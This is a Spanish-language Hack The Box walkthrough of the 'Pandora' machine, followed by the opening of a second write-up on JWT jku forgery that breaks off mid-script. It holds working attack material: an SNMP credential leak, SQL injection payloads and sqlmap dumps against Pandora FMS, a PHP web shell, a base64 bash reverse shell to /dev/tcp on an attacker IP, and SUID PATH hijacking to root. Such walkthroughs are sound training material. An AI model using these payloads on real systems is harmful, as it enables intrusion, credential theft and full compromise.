98.29 seconds Raw packets sent: 231 (12.751KB) | Rcvd: 106 (9.126KB)  Se ve que SNMP está habilitado. Este protocolo se utiliza para configuraciones de red. Podemos usar snmpwalk para obtener todas las configuraciones expuestas por el servidor:\nTenemos que especificar v2c como versión y public como community string:\n$ snmpwalk -v2c -c public 10.10.11.136 | tee enum/snmpwalk.out SNMPv2-MIB::sysDescr.0 = STRING: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10 DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (3230601) 8:58:26.01 SNMPv2-MIB::sysContact.0 = STRING: Daniel SNMPv2-MIB::sysName.0 = STRING: pandora SNMPv2-MIB::sysLocation.0 = STRING: Mississippi ... HOST-RESOURCES-MIB::hrSWRunParameters.767 = STRING: \"--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\" HOST-RESOURCES-MIB::hrSWRunParameters.781 = STRING: \"--foreground\" HOST-RESOURCES-MIB::hrSWRunParameters.782 = STRING: \"/usr/bin/networkd-dispatcher --run-startup-triggers\" HOST-RESOURCES-MIB::hrSWRunParameters.784 = STRING: \"-n -iNONE\" HOST-RESOURCES-MIB::hrSWRunParameters.786 = \"\" HOST-RESOURCES-MIB::hrSWRunParameters.788 = \"\" HOST-RESOURCES-MIB::hrSWRunParameters.823 = STRING: \"-f\" HOST-RESOURCES-MIB::hrSWRunParameters.825 = STRING: \"-f\" HOST-RESOURCES-MIB::hrSWRunParameters.834 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\" HOST-RESOURCES-MIB::hrSWRunParameters.852 = STRING: \"-f\" HOST-RESOURCES-MIB::hrSWRunParameters.858 = STRING: \"-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid\" ...  Hay mucha información. Podemos encontrar este comando extraño:\n/bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'  Parece que daniel es un nombre de usuario y HotelBabylon23 es su contraseña.\nPodemos reutilizar estas credenciales para acceder por SSH con daniel:\n$ ssh daniel@10.10.11.136 daniel@10.10.11.136's password: daniel@pandora:~$  Enumeración del sistema Pero no hay flag user.txt aquí:\ndaniel@pandora:~$ ls -la total 28 drwxr-xr-x 4 daniel daniel 4096 Feb 19 16:26 . drwxr-xr-x 4 root root 4096 Dec 7 14:32 .. lrwxrwxrwx 1 daniel daniel 9 Jun 11 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 daniel daniel 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 daniel daniel 3771 Feb 25 2020 .bashrc drwx------ 2 daniel daniel 4096 Feb 19 16:26 .cache -rw-r--r-- 1 daniel daniel 807 Feb 25 2020 .profile drwx------ 2 daniel daniel 4096 Dec 7 14:32 .ssh  La flag se encuentra en /home/matt, por lo que tendremos que pivotar al usuario matt:\ndaniel@pandora:~$ find /home -name user.txt 2/dev/null /home/matt/user.txt  No podemos ejecutar sudo:\ndaniel@pandora:~$ sudo -l [sudo] password for daniel: Sorry, user daniel may not run sudo on pandora.  Pero sí que hay un binario SUID raro llamado /usr/bin/pandora_backup:\ndaniel@pandora:~$ find / -perm -4000 2\u0026gt;/dev/null /usr/bin/sudo /usr/bin/pkexec /usr/bin/chfn /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/umount /usr/bin/pandora_backup /usr/bin/passwd /usr/bin/mount /usr/bin/su /usr/bin/at /usr/bin/fusermount /usr/bin/chsh /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1  Y matt es capaz de ejecutarlo (como miembro de grupo):\ndaniel@pandora:~$ ls -l /usr/bin/pandora_backup -rwsr-x--- 1 root matt 16816 Dec 3 15:58 /usr/bin/pandora_backup  Entonces, está claro que tenemos que convertirnos en matt.\nPodemos echar un vistazo a la configuración del servidor Apache y encontrar pandora.conf:\ndaniel@pandora:~$ cd /etc/apache2 daniel@pandora:/etc/apache2$ ll sites-enabled/ total 8 drwxr-xr-x 2 root root 4096 Dec 3 12:57 ./ drwxr-xr-x 8 root root 4096 Dec 7 12:59 ../ lrwxrwxrwx 1 root root 35 Dec 3 12:56 000-default.conf -\u0026gt; ../sites-available/000-default.conf lrwxrwxrwx 1 root root 31 Dec 3 12:53 pandora.conf -\u0026gt; ../sites-available/pandora.conf daniel@pandora:/etc/apache2$ cat sites-enabled/pandora.conf \u0026lt;VirtualHost localhost:80\u0026gt; ServerAdmin admin@panda.htb ServerName pandora.panda.htb DocumentRoot /var/www/pandora AssignUserID matt matt \u0026lt;Directory /var/www/pandora\u0026gt; AllowOverride All \u0026lt;/Directory\u0026gt; ErrorLog /var/log/apache2/error.log CustomLog /var/log/apache2/access.log combined \u0026lt;/VirtualHost\u0026gt;  Vemos que usa pandora.panda.htb como subdominio. Sin embargo, incluso si lo añadimos a /etc/hosts, veremos la misma página de antes. Pero el resultado desde la máquina es distinto:\ndaniel@pandora:/etc/apache2$ curl localhost -H 'Host: pandora.panda.htb' \u0026lt;meta HTTP-EQUIV=\"REFRESH\" content=\"0; url=/pandora_console/\"\u0026gt;  Enumeración de Pandora FMS Por tanto, tenemos que usar un reenvío de puertos para acceder a esta página web desde nuestra máquina de atacante (podemos usar ENTER + ~C para acceder a la interfaz de ssh\u0026gt; y añadir la configuración del reenvío de puertos):\ndaniel@pandora:/etc/apache2$ cd daniel@pandora:~$ daniel@pandora:~$ ssh -L 8000:127.0.0.1:80 Forwarding port. daniel@pandora:~$  Ahora podemos acceder desde nuestra máquina de atacante:\n$ curl localhost:8000 -H 'Host: pandora.panda.htb' \u0026lt;meta HTTP-EQUIV=\"REFRESH\" content=\"0; url=/pandora_console/\"\u0026gt;  Y podemos ver la página en el navegador:\nPodemos probar las credenciales de daniel, pero dice que este usuario solo puede usar la API:\nSin embargo, vemos la versión en la parte de abajo de la página: v7.0NG.742_FIX_PERL2020. Ahora podemos empezar a buscar vulnerabilidades y exploits. De hecho, llegaremos a blog.sonarsource.com, que muestra una inyección de código SQL (CVE-2021-32099) para saltarse la autenticación y acceder como administrador.\nExplotación de SQLi en Pandora FMS La vulnerabilidad de SQLi está en /pandora_console/include/chart_generator.php, en un parámetro de URL llamado session_id:\n$ curl -sG localhost:8000/pandora_console/include/chart_generator.php --data-urlencode \"session_id='\" | head -1 \u0026lt;strong\u0026gt;SQL error\u0026lt;/strong\u0026gt;: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WHERE `id_session` = ''' LIMIT 1') in \u0026lt;strong\u0026gt;/var/www/pandora/pandora_console/include/db/mysql.php\u0026lt;/strong\u0026gt; on line 114\u0026lt;br /\u0026gt;  Se trata de un SQLi de tipo Error-based, y disponemos de la consulta SQL:\nSELECT * FROM tsessions_php WHERE `id_session` = '$session_id' LIMIT 1  Donde $session_id es el punto donde está la inyección SQL. Ahora podemos continuar con sentencias UNION para determinar el número de columnas de la tabla tsessions_php:\n$ curl -sG localhost:8000/pandora_console/include/chart_generator.php --data-urlencode \"session_id=' union select 1-- -\" | head -1 \u0026lt;strong\u0026gt;SQL error\u0026lt;/strong\u0026gt;: The used SELECT statements have a different number of columns ('SELECT * FROM tsessions_php WHERE `id_session` = '' union select 1-- -' LIMIT 1') in \u0026lt;strong\u0026gt;/var/www/pandora/pandora_console/include/db/mysql.php\u0026lt;/strong\u0026gt; on line 114\u0026lt;br /\u0026gt; $ curl -sG localhost:8000/pandora_console/include/chart_generator.php --data-urlencode \"session_id=' union select 1,2-- -\" | head -1 \u0026lt;strong\u0026gt;SQL error\u0026lt;/strong\u0026gt;: The used SELECT statements have a different number of columns ('SELECT * FROM tsessions_php WHERE `id_session` = '' union select 1,2-- -' LIMIT 1') in \u0026lt;strong\u0026gt;/var/www/pandora/pandora_console/include/db/mysql.php\u0026lt;/strong\u0026gt; on line 114\u0026lt;br /\u0026gt; $ curl -sG localhost:8000/pandora_console/include/chart_generator.php --data-urlencode \"session_id=' union select 1,2,3-- -\" | head -1 \u0026lt;!DOCTYPE html\u0026gt;  Vale, hay tres columnas en tsessions_php. En este punto, podemos usar sqlmap para obtener todo el contenido de la tabla:\n$ sqlmap --url 'http://localhost:8000/pandora_console/include/chart_generator.php?session_id=1' --batch --flush --technique UE --dbms mysql -T tsessions_php --dump ___ __H__ ___ ___[)]_____ ___ ___ {1.6.5#stable} |_ -| . [,] | .'| . | |___|_ [\"]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting [hh:mm:ss] [INFO] flushing session file [hh:mm:ss] [INFO] testing connection to the target URL [hh:mm:ss] [WARNING] potential permission problems detected ('Access denied') you have not declared cookie(s), while server wants to set its own ('PHPSESSID=gn6g2mp11db...rsi1fq9l61'). Do you want to use those [Y/n] Y [hh:mm:ss] [INFO] checking if the target is protected by some kind of WAF/IPS [hh:mm:ss] [INFO] heuristic (basic) test shows that GET parameter 'session_id' might be injectable (possible DBMS: 'MySQL') [hh:mm:ss] [INFO] heuristic (XSS) test shows that GET parameter 'session_id' might be vulnerable to cross-site scripting (XSS) attacks [hh:mm:ss] [INFO] testing for SQL injection on GET parameter 'session_id' for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' [hh:mm:ss] [WARNING] reflective value(s) found and filtering out [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' [hh:mm:ss] [INFO] GET parameter 'session_id' is 'MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable [hh:mm:ss] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns' [hh:mm:ss] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns' [hh:mm:ss] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns' ... GET parameter 'session_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 468 HTTP(s) requests: --- Parameter: session_id (GET) Type: error-based Title: MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: session_id=1'||(SELECT 0x5a664853 FROM DUAL WHERE 9303=9303 AND (SELECT 2523 FROM(SELECT COUNT(*),CONCAT(0x716a6a7871,(SELECT (ELT(2523=2523,1))),0x71626a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||' --- [hh:mm:ss] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal) web application technology: PHP, Apache 2.4.41 back-end DBMS: MySQL \u0026gt;= 5.0 (MariaDB fork) [hh:mm:ss] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries [hh:mm:ss] [INFO] fetching current database [hh:mm:ss] [INFO] retrieved: 'pandora' [hh:mm:ss] [INFO] fetching columns for table 'tsessions_php' in database 'pandora' [hh:mm:ss] [INFO] retrieved: 'id_session' [hh:mm:ss] [INFO] retrieved: 'char(52)' [hh:mm:ss] [INFO] retrieved: 'last_active' [hh:mm:ss] [INFO] retrieved: 'int(11)' [hh:mm:ss] [INFO] retrieved: 'data' [hh:mm:ss] [INFO] retrieved: 'text' [hh:mm:ss] [INFO] fetching entries for table 'tsessions_php' in database 'pandora' ... Database: pandora Table: tsessions_php [46 entries] +----------------------------+-----------------------------------------------------+-------------+ | id_session | data | last_active | +----------------------------+-----------------------------------------------------+-------------+ | 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:\"daniel\"; | 1638783555 | | 0ahul7feb1l9db7ffp8d25sjba | NULL | 1638789018 | | 126fq2t95047ct8b59b5dncu41 | NULL | 1653964108 | | 1um23if7s531kqf5da14kf5lvm | NULL | 1638792211 | | 2e25c62vc3odbppmg6pjbf9bum | NULL | 1638786129 | | 346uqacafar8pipuppubqet7ut | id_usuario|s:6:\"daniel\"; | 1638540332 | | 3me2jjab4atfa5f8106iklh4fc | NULL | 1638795380 | | 4f51mju7kcuonuqor3876n8o02 | NULL | 1638786842 | | 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:\"daniel\"; | 1638535373 | | 4q1oc8aoh1a4irrckahfetujmc | NULL | 1653964112 | | 59qae699l0971h13qmbpqahlls | NULL | 1638787305 | | 5fihkihbip2jioll1a8mcsmp6j | NULL | 1638792685 | | 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:\"daniel\"; | 1638281946 | | 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:\"daniel\"; | 1641195617 | | 81f3uet7p3esgiq02d4cjj48rc | NULL | 1623957150 | | 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:\"daniel\"; | 1638446321 | | 8upeameujo9nhki3ps0fu32cgd | NULL | 1638787267 | | 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:\"daniel\"; | 1638881787 | | a3a49kc938u7od6e6mlip1ej80 | NULL | 1638795315 | | agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:\"daniel\"; | 1638881664 | | cojb6rgubs18ipb35b3f6hf0vp | NULL | 1638787213 | | d0carbrks2lvmb90ergj7jv6po | NULL | 1638786277 | | f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:\"daniel\"; | 1641200284 | | fikt9p6i78no7aofn74rr71m85 | NULL | 1638786504 | | fqd96rcv4ecuqs409n5qsleufi | NULL | 1638786762 | | g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:\"daniel\"; | 1638783230 | | g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:\"matt\";alert_msg|a:0:{}new_chat|b:0; | 1638796349 | | gf40pukfdinc63nm5lkroidde6 | NULL | 1638786349 | | gn6g2mp11dba8ij2rsi1fq9l61 | NULL | 1653964201 | | heasjj8c48ikjlvsf1uhonfesv | NULL | 1638540345 | | hoasg65m5n6lh9vjthb4ub1tm6 | NULL | 1653964104 | | hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:\"daniel\"; | 1638168492 | | imehjf0deppr112i03a12t4v4b | id_usuario|s:6:\"daniel\"; | 1653963989 | | jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:\"daniel\"; | 1638456173 | | kp90bu1mlclbaenaljem590ik3 | NULL | 1638787808 | | ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL | 1638796348 | | o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:\"daniel\"; | 1638540482 | | oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:\"daniel\"; | 1637667827 | | pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:\"daniel\"; | 1638168416 | | qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL | 1638787723 | | r097jr6k9s7k166vkvaj17na1u | NULL | 1638787677 | | rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:\"daniel\"; | 1638889082 | | tim898ul2ljiqgcmcnbnc54knl | NULL | 1653964084 | | u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:\"daniel\"; | 1638547193 | | u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:\"daniel\"; | 1638793297 | | uk1r72on9hmlvbo9k49k6be3vo | NULL | 1653964098 | +----------------------------+-----------------------------------------------------+-------------+ ...  Tenemos todas las sesiones activas en el servidor. Nótese que hay una que pertenete a matt: g4e01qdgk36mfdh90hvcc54umq. Si modificamos la cookie PHPSESSID en el navegador por este valor y recargamos la página, entraremos en la sesión de matt:\nMovimiento lateral al usuario matt Pero no somos administrador\u0026hellip; Para acceder como administrador tenemos que usar el siguiente payload SQLi:\nsession_id=' union select 1,2,'id_usuario|s:5:\"admin\";'-- -  Este payload pondrá automáticamente la sesión de admin porque chart_generator.php también es vulnerable a deserialización PHAR insegura:\n$ curl -siG localhost:8000/pandora_console/include/chart_generator.php --data-urlencode \"session_id=' union select 1,2,'id_usuario|s:5:\\\"admin\\\";'-- -\" | grep PHPSESSID Set-Cookie: PHPSESSID=t365p1tcdkbv3vva23q2j79rso; path=/  Ahora cogemos esta cookie de sesión y la ponemos de nuevo en el navegador. Y somos admin:\nEn este punto, podemos subir un fichero PHP (r.php) para ganar ejecución remota de comandos (RCE) en el servidor como matt:\n\u0026lt;?php system($_GET['c']); ?\u0026gt;  Ahora podemos buscar el archivo r.php y obtener una reverse shell como matt:\ndaniel@pandora:~$ find /var/www -name r.php 2/dev/null /var/www/pandora/pandora_console/images/r.php  $ echo -n 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ curl 'localhost:8000/pandora_console/images/r.php?c=echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx+|+base64+-d+|+bash'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.136. Ncat: Connection from 10.10.11.136:35298. bash: cannot set terminal process group (888): Inappropriate ioctl for device bash: no job control in this shell matt@pandora:/var/www/pandora/pandora_console/images$ cd / cd / matt@pandora:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null matt@pandora:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm matt@pandora:/$ export TERM=xterm matt@pandora:/$ export SHELL=bash matt@pandora:/$ stty rows 50 columns 158  Escalada de privilegios En este punto, podemos analizar lo que hace /usr/bin/pandora_backup (binario SUID):\nmatt@pandora:/home/matt$ ltrace /usr/bin/pandora_backup getuid() = 1000 geteuid() = 1000 setreuid(1000, 1000) = 0 puts(\"PandoraFMS Backup Utility\"PandoraFMS Backup Utility ) = 26 puts(\"Now attempting to backup Pandora\"...Now attempting to backup PandoraFMS client ) = 43 system(\"tar -cvf /root/.backup/pandora-b\"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied tar: Error is not recoverable: exiting now \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 512 puts(\"Backup failed!\\nCheck your permis\"...Backup failed! Check your permissions! ) = 39 +++ exited (status 1) +++  Vemos que usa tar sin indicar una ruta absoluta, por lo que es vulnerable a PATH hijacking. Vamos a realizar el ataque:\nmatt@pandora:/$ cd /tmp matt@pandora:/tmp$ cat  tar #!/bin/bash chmod 4755 /bin/bash ^C matt@pandora:/tmp$ chmod +x tar matt@pandora:/tmp$ which tar /usr/bin/tar matt@pandora:/tmp$ export PATH=/tmp:$PATH matt@pandora:/tmp$ which tar /tmp/tar  Ahora, tar será ejecutado como /tmp/tar, de manera que /bin/bash será configurado como SUID también:\nmatt@pandora:/tmp$ /usr/bin/pandora_backup PandoraFMS Backup Utility Now attempting to backup PandoraFMS client chmod: changing permissions of '/bin/bash': Operation not permitted Backup failed! Check your permissions! matt@pandora:/tmp$ ls -l /bin/bash -rwxr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash  Pero por alguna razón, el ataque no está funcionando. Vamos a intentar por SSH. Para ello, tenemos que usar claves SSH:\n$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (~/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa Your public key has been saved in ./id_rsa.pub The key fingerprint is: SHA256:7aEfZ2kv6cZXqHKtyYKPtuPW7CTkAl4OqLYkkXd9ehY The key's randomart image is: +---[RSA 3072]----+ | | | | | | | . . . . | |o o + o E o . | | + o = = + . .. .| |oo . + *++.=+ . | |+ . +===*Boo | | . ++=+*=+. | +----[SHA256]-----+ $ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r/Dohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn/7FOQbAyeKko1BdJwlTlrxaNSo+WyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf+PsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji/y1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq/qIqQy9xVwwl2KJ3df/5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot+k0KxaLZpY+DxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k=  matt@pandora:/tmp$ cd /home/matt matt@pandora:/tmp$ ls -la total 24 drwxr-xr-x 2 matt matt 4096 Dec 7 15:00 . drwxr-xr-x 4 root root 4096 Dec 7 14:32 .. lrwxrwxrwx 1 matt matt 9 Jun 11 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 matt matt 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 matt matt 3771 Feb 25 2020 .bashrc -rw-r--r-- 1 matt matt 807 Feb 25 2020 .profile -rw-r----- 1 root matt 33 May 31 02:26 user.txt matt@pandora:/home/matt$ mkdir .ssh matt@pandora:/home/matt$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r/Dohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn/7FOQbAyeKko1BdJwlTlrxaNSo+WyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf+PsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji/y1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq/qIqQy9xVwwl2KJ3df/5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot+k0KxaLZpY+DxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k=' \u0026gt;\u0026gt; .ssh/authorized_keys  $ ssh -i id_rsa matt@10.10.11.136 matt@pandora:~$ cat user.txt 9a360fbf015ce0c7b2c73fd1ac3baa19  Vale, vamos a repetir el ataque:\nmatt@pandora:~$ cd /tmp matt@pandora:/tmp$ cat  tar #!/bin/bash chmod 4755 /bin/bash ^C matt@pandora:/tmp$ chmod +x tar matt@pandora:/tmp$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin matt@pandora:/tmp$ which tar /usr/bin/tar matt@pandora:/tmp$ export PATH=/tmp:$PATH matt@pandora:/tmp$ which tar /tmp/tar matt@pandora:/tmp$ ls -l /bin/bash -rwxr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash matt@pandora:/tmp$ /usr/bin/pandora_backup PandoraFMS Backup Utility Now attempting to backup PandoraFMS client Backup successful! Terminating program! matt@pandora:/tmp$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash  ¡Funciona! Aquí tenemos la flag root.txt:\nmatt@pandora:/tmp$ bash -p bash-5.0# cat /root/root.txt a05061c0477ab2ca820a0e4bdf6d8002  ","image":"/images/HTB/Pandora/Pandora.png","permalink":"https://7rocky.github.io/htb/pandora/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina expone información sensible por SNMP que permite acceder a la máquina. Luego, encontramos una instancia local de Pandora FMS que tiene varias vulnerabilidades y pueden ser explotadas para conseguir RCE como otro usuario. Este usuario puede ejecutar un binario SUID que es vulnerable a PATH hijacking, pero el ataque tiene que ser realizado desde una sesión de SSH. Para comprometer esta máquina se necesitan habilidades de enumeración y pentesting básicas","time":12,"title":"Pandora"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.126   Fecha: 27 / 11 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.126 -p 22,80 Nmap scan report for 10.10.11.126 Host is up (0.057s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA) | 256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA) |_ 256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: 503 |_http-trane-info: Problem with XML parsing of /evox/about |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.27 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración web Si vamos a http://10.10.11.126 veremos una página como esta:\nVemos que hay una funcionalidad de redirección (el botón que dice \u0026ldquo;Google about us\u0026rdquo;):\nTambién podemos registrar una nueva cuenta en /register/:\nLuego, podemos iniciar sesión en /login/ y acceder a nuestro dashboard en /dashboard/:\nSi tratamos de registrar una cuenta como admin, veremos que este usuario ya existe:\nSi examinamos la cookie que pone el servidor, vemos que es un token JWT. El contenido del token se puede mostrar fácilmente en jwt.io:\nAquí vemos una claim JWT rara (esto es, una pareja clave-valor en la sección de la cabecera). La clave jku no es muy común. Vemos que hay un dominio hackmedia.htb, por lo que podemos añadirlo a /etc/hosts apuntando a 10.10.11.126.\nAhora, podemos solicitar http://hackmedia.htb/static/jwks.json:\n$ curl -s hackmedia.htb/static/jwks.json | jq { \"keys\": [ { \"kty\": \"RSA\", \"use\": \"sig\", \"kid\": \"hackthebox\", \"alg\": \"RS256\", \"n\": \"AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs\", \"e\": \"AQAB\" } ] }  Esto es un JSON Web Key Set (JWKS). Se utiliza para almacenar la clave pública RSA que verifica el token JWT, porque el token fue firmado con la correspondiente clave privada RSA en el momento de su creación.\nFalsificando un token JWT La idea es sencilla, primero, creamos un par de claves RSA pública y privada. Luego, podemos generar un JWKS con la clave pública y exponerla mediante un servidor web. Después, podemos falsificar un token JWT que tenga admin como usuario y un valor de jku que apunte a nuestro JWKS y firmar el token con nuestra clave privada.\nFinalmente, la máquina víctima recibirá el token falso y para verificarlo, el servidor cogerá nuestro JWKS y realizará le verificación de forma correcta.\nPara este propósito, vamos a usar un script en Python como este:\n#!/usr/bin/env python3 import base64 import json import jwt import sys from Crypto.PublicKey import RSA from Crypto.Util.number import long_to_bytes from http.server import HTTPServer, SimpleHTTPRequestHandler privkey = open('priv.key').read() pubkey = RSA.import_key(open('pub.key').read()) def int_to_b64(x: str | int) -\u0026gt; str: return 